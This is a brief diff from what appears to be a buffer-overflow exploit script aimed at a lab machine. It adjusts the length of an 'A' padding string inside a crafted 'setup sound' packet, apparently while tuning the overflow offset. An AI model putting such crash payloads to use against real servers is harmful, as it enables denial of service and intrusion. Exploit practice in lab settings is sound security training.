@@ -4,7 +4,7 @@ import socket
 
 host='192.168.56.110'
 
-crash='A' * 4380
+crash='A' * 4379
 
 buffer='\x11(setup sound ' + crash + '\x90\x00#'
 
